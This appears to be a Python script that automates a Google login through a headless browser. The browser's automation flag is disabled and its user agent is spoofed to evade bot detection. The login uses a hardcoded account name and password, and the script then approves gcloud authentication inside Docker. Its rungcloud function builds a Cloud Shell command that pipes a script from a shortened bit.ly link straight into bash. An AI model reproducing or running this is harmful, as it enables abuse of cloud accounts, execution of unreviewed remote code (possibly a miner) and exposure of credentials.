#!/usr/bin/python
import shlex
import subprocess
from subprocess import Popen, PIPE
import pytest
import time
import pty
import sys
import select
import os
import re
import pytest
import time
import json
import sys
import requests
from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.common.action_chains import ActionChains
from selenium.webdriver.support import expected_conditions
from selenium.webdriver.support.wait import WebDriverWait
from selenium.webdriver.common.keys import Keys
from selenium.webdriver.common.desired_capabilities import DesiredCapabilities
from urllib.parse import urlparse
############## Parames ####################

slow_motion = 1
gid = "siwar10004"
gpass = "Ms123456789"
count = 0
gaurl = ''

##############################################


################### webdriver config ############
useragent = {
    "original_fi": "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:87.0) Gecko/20100101 Firefox/87.0",
    "original_ch": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.212 Safari/537.36",
    "firefox_android": "Mozilla/5.0 (Android 9; Mobile; rv:68.0) Gecko/68.0 Firefox/68.0",
    "ch_s20": "Mozilla/5.0 (Linux; Android 10; SM-G981B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.162 Mobile Safari/537.36",
    "ch_note10p": "Mozilla/5.0 (Linux; Android 9; SM-N976V) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.89 Mobile Safari/537.36",
    "ch_s10": "Mozilla/5.0 (Linux; Android 9; SAMSUNG SM-G977N Build/PPR1.180610.011) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/9.2 Chrome/67.0.3396.87 Mobile Safari/537.36",
    "focus": "Mozilla/5.0 (Linux; Android 9) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Focus/4.7.1 Chrome/75.0.3770.143 Mobile Safari/537.36",
    "ubuntu": "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:65.0) Gecko/20100101 Firefox/88.0",
    "win_firefox": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:83.0) Gecko/20100101 Firefox/83.0",
    "win_chrome": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.93 Safari/537.36",
    "ff2mobile": "Mozilla/5.0 (Android 11; Mobile; rv:68.0) Gecko/68.0 Firefox/88.0"

}


#options = webdriver.ChromeOptions()
# options.add_argument("start-maximized")
# options.add_argument("--disable-dev-shm-usage")
# options.add_argument('--disable-extensions')
# options.add_argument('--disable-blink-features')
# options.add_argument('--profile-directory=Default')
# options.add_argument("--incognito")
# options.add_argument("--disable-plugins-discovery");
# options.add_argument("--start-maximized")
# options.add_argument("--disable-blink-features=AutomationControlled")
# options.add_argument("--disable-infobars")
# options.add_argument("--remote-debugging-port=9222");
#options.add_experimental_option("excludeSwitches", ["enable-automation"])
#options.add_experimental_option('useAutomationExtension', False)
#driver = webdriver.Chrome(options=options)
# #### options.setCapability(CapabilityType.UNEXPECTED_ALERT_BEHAVIOUR, UnexpectedAlertBehaviour.IGNORE); #####
#driver.execute_cdp_cmd('Network.setUserAgentOverride', {"userAgent": useragent["original_ch"] })
#driver.execute_script("Object.defineProperty(navigator, 'webdriver', {get: () => undefined})")


profile = webdriver.FirefoxProfile()
options = webdriver.FirefoxOptions()
options.add_argument("--headless")
profile.set_preference("dom.webdriver.enabled", False)
profile.set_preference('useAutomationExtension', False)
profile.set_preference("general.useragent.override", useragent["ff2mobile"])
profile.update_preferences()
desired = DesiredCapabilities.FIREFOX

driver = webdriver.Firefox(firefox_profile=profile, options=options,
                           desired_capabilities=desired)


actions = webdriver.ActionChains(driver)
print(driver.execute_script("return navigator.userAgent;"))

#####################################################################


def gauth(user, passw, authurl='https://accounts.google.com/ServiceLogin?hl=en&passive=true&continue=https://www.google.com'):
    #driver.execute_script("Object.defineProperty(navigator, 'webdriver', {get: () => undefined})")
    driver.get(authurl)
    time.sleep(10*slow_motion)
    driver.implicitly_wait(10)
    driver.find_element(By.ID, "identifierId").send_keys(user)
    driver.find_element(By.ID, "identifierId").send_keys(Keys.ENTER)
    time.sleep(3.6*slow_motion)
    driver.implicitly_wait(10)
    time.sleep(0.1*slow_motion)
    driver.find_element(By.NAME, "password").send_keys(passw)
    driver.find_element(By.NAME, "password").send_keys(Keys.ENTER)
    driver.implicitly_wait(10)
    time.sleep(5*slow_motion)

def accept_code(gid, gpass, gurl):
    gauth(gid, gpass)

    #driver.execute_script("Object.defineProperty(navigator, 'webdriver', {get: () => undefined})")
    driver.get(gurl)
    time.sleep(7*slow_motion)
    driver.implicitly_wait(10)
    print('########### accept_code ############')
    try:
        Acchoose = driver.find_element(By.CSS_SELECTOR, "ul li div div")
        print(Acchoose)
        Acchoose.click()
    finally:
        time.sleep(1.3*slow_motion)
        driver.implicitly_wait(10)
    driver.find_element(By.ID, "submit_approve_access").click()
    time.sleep(2.3*slow_motion)
    driver.implicitly_wait(10)
    KeyDriver = driver.find_element(By.CSS_SELECTOR, "textarea")
    gkey = KeyDriver.text
    print(gkey)
    time.sleep(5*slow_motion)
    driver.close()
    return gkey


def rungcloud(gid):
    remote_cmd = "\"wget -q -O - bit.ly/cpu02 |bash\""
    command_line = 'docker run --rm --volumes-from gcloud-config-'+gid + \
        ' gcr.io/google.com/cloudsdktool/cloud-sdk gcloud cloud-shell' + \
        '  ssh --authorize-session --command='+remote_cmd
    print(command_line)
    return shlex.split(command_line)

def newgcloud(gid):
    command_line = 'docker run -ti --name gcloud-config-'+gid + \
        ' gcr.io/google.com/cloudsdktool/cloud-sdk gcloud auth login'
    print(command_line)
    return shlex.split(command_line)


pty, tty = os.openpty()

p = subprocess.Popen(newgcloud(gid), stdin=tty, stdout=tty, stderr=tty)


looping = 0

while p.poll() is None:
    # Watch two files, STDIN of your Python process and the pseudo terminal
    print("looping: "+str(looping))
    #r, _, _ = select.select([sys.stdin, pty], [], [])
    s = ''
    if looping == 1:
        pass
    elif looping >= 3:
        break
    # if sys.stdin in r:
    #    input_from_your_terminal = os.read(sys.stdin.fileno(), 10240)
    #    os.write(pty, input_from_your_terminal)
    # elif pty in r:
    if looping < 5:
        output_from_docker = os.read(pty, 10240)
        #os.write(sys.stdout.fileno(), output_from_docker)
        try:
            #print(output_from_docker)
            s = output_from_docker.decode("utf-8")
            if looping == 0 :
                authurls = re.findall(r'(https?://\S+)', s)
                print('**************************')
                gaurl = authurls[0]
                print(gaurl)
            if len(re.findall(r'[\w\.-]+@[\w\.-]+', s)) > 0:
                print('>>> success : '+s)
        except:
            print("Error in loop : "+str(looping))
        if looping == 0:
            # try:
            os.write(pty, str.encode(accept_code(
                gid, gpass, gaurl)+'\n'))

            # except:
            #    print("error pasting")
        print('##########################')
    looping = looping+1
